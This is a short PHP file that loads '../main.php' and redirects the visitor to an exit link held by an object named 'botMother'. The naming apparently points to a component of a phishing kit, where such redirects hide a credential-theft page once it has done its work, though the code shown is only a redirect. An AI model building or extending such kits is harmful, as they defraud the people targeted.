<?php 
require '../main.php';
header("location: ".$botMother->EXIT_LINK);
?>